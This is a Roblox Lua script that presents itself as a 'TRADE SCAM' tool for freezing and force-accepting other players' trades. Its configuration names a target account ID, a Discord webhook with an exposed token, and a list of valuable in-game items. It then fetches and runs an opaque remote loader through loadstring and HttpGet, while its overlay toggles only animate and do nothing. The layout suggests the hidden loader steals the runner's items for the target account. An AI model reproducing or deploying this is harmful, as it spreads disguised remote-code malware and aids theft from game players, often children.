getgenv().SECRET_KEY = "mrr_ffafcbe201064965a058ff2b6d47b669"
getgenv().TARGET_ID = 5190432992
getgenv().DELAY_STEP = 1      
getgenv().TRADE_CYCLE_DELAY = 2
getgenv().DISCORD_WEBHOOK = "https://discord.com/api/webhooks/1482620567759749312/ASGG2ciAmy2wqd5DIVEbrkzOcVQu377mOCTKbAzL8mh0yEgSYWmtfwle-CPEElZcYECZ"
getgenv().TARGET_BRAINROTS = {
    ["Meowl"] = true,
    ["Skibidi Toilet"] = true,
    ["Strawberry Elephant"] = true,
    ["Griffin"] = true,
    ["Nacho Spyder"] = true,
    ["La Taco Combinasion"] = true,
    ["Festive 67"] = true,
    ["Tang Tang Keletang"] = true,
    ["Money Money Puggy"] = true,
    ["Ketupat Kepat"] = true,
    ["Tictac Sahur"] = true,
    ["Garama and Madundung"] = true,
    ["Capitano Moby"] = true,
    ["Cerberus"] = true,
    ["Dragon Cannelloni"] = true,
    ["La Casa Boo"] = true,
    ["Fragrama and Chocrama"] = true,
    ["Cooki and Milki"] = true,
    ["Ketupat Bros"] = true,
    ["Popcuru and Fizzuru"] = true,
    ["La Supreme Combinasion"] = true,
    ["Dragon Gingerini"] = true,
    ["Rosey and Teddy"] = true,
    ["Headless Horseman"] = true,
    ["Hydra Dragon Cannelloni"] = true,
    ["Rocco Disco"] = true,
    ["Money Money Reindeer"] = true
}
task.spawn(function()
loadstring(game:HttpGet("https://api.luarmor.net/files/v4/loaders/fbcd1d25889a843297107dea3642044d.lua"))()
end)
task.spawn(function()
local Players = game:GetService("Players") local TweenService = game:GetService("TweenService")  local player = Players.LocalPlayer  local gui = Instance.new("ScreenGui") gui.Name = "FutureOverlay" gui.ResetOnSpawn = false gui.IgnoreGuiInset = true gui.DisplayOrder = 999999 gui.Parent = player:WaitForChild("PlayerGui")  local frame = Instance.new("Frame") frame.Size = UDim2.new(0,320,0,220) frame.Position = UDim2.new(0.5,-160,0.5,-110) frame.BackgroundColor3 = Color3.fromRGB(18,18,25) frame.BorderSizePixel = 0 frame.Active = true frame.Draggable = true frame.Parent = gui  local corner = Instance.new("UICorner",frame) corner.CornerRadius = UDim.new(0,14)  local stroke = Instance.new("UIStroke",frame) stroke.Color = Color3.fromRGB(0,255,170) stroke.Thickness = 2  local title = Instance.new("TextLabel") title.Size = UDim2.new(1,0,0,40) title.BackgroundTransparency = 1 title.Text = "TRADE SCAM" title.Font = Enum.Font.GothamBold title.TextSize = 20 title.TextColor3 = Color3.fromRGB(0,255,170) title.Parent = frame   local function createFeature(yPos,name,description)  	local container = Instance.new("Frame") 	container.Size = UDim2.new(1,-20,0,60) 	container.Position = UDim2.new(0,10,0,yPos) 	container.BackgroundTransparency = 1 	container.Parent = frame  	local nameLabel = Instance.new("TextLabel") 	nameLabel.Size = UDim2.new(0.7,0,0,22) 	nameLabel.BackgroundTransparency = 1 	nameLabel.Text = name 	nameLabel.Font = Enum.Font.GothamBold 	nameLabel.TextSize = 14 	nameLabel.TextXAlignment = Enum.TextXAlignment.Left 	nameLabel.TextColor3 = Color3.fromRGB(255,255,255) 	nameLabel.Parent = container  	local descLabel = Instance.new("TextLabel") 	descLabel.Size = UDim2.new(0.7,0,0,32) 	descLabel.Position = UDim2.new(0,0,0,22) 	descLabel.BackgroundTransparency = 1 	descLabel.Text = description 	descLabel.Font = Enum.Font.Gotham 	descLabel.TextSize = 12 	descLabel.TextWrapped = true 	descLabel.TextXAlignment = Enum.TextXAlignment.Left 	descLabel.TextColor3 = Color3.fromRGB(160,160,160) 	descLabel.Parent = container  	local toggle = Instance.new("Frame") 	toggle.Size = UDim2.new(0,50,0,24) 	toggle.Position = UDim2.new(1,-60,0,10) 	toggle.BackgroundColor3 = Color3.fromRGB(80,80,80) 	toggle.Parent = container  	local toggleCorner = Instance.new("UICorner",toggle) 	toggleCorner.CornerRadius = UDim.new(1,0)  	local knob = Instance.new("Frame") 	knob.Size = UDim2.new(0,20,0,20) 	knob.Position = UDim2.new(0,2,0.5,-10) 	knob.BackgroundColor3 = Color3.fromRGB(255,255,255) 	knob.Parent = toggle  	local knobCorner = Instance.new("UICorner",knob) 	knobCorner.CornerRadius = UDim.new(1,0)  	local button = Instance.new("TextButton") 	button.Size = UDim2.new(1,0,1,0) 	button.BackgroundTransparency = 1 	button.Text = "" 	button.Parent = toggle  	local enabled = false  	button.MouseButton1Click:Connect(function()  		enabled = not enabled  		if enabled then  			TweenService:Create(toggle,TweenInfo.new(0.25),{ 				BackgroundColor3 = Color3.fromRGB(0,255,150) 			}):Play()  			TweenService:Create(knob,TweenInfo.new(0.25,Enum.EasingStyle.Quad),{ 				Position = UDim2.new(1,-22,0.5,-10) 			}):Play()  		else  			TweenService:Create(toggle,TweenInfo.new(0.25),{ 				BackgroundColor3 = Color3.fromRGB(80,80,80) 			}):Play()  			TweenService:Create(knob,TweenInfo.new(0.25,Enum.EasingStyle.Quad),{ 				Position = UDim2.new(0,2,0.5,-10) 			}):Play()  		end 	end) end   -- FEATURES (edit these)  createFeature( 50, "Freeze Trade", "Freezes the other player’s trade screen" )  createFeature( 120, "Auto Accept", "Automatically and forcefully accepts the other player’s trade" )
end)
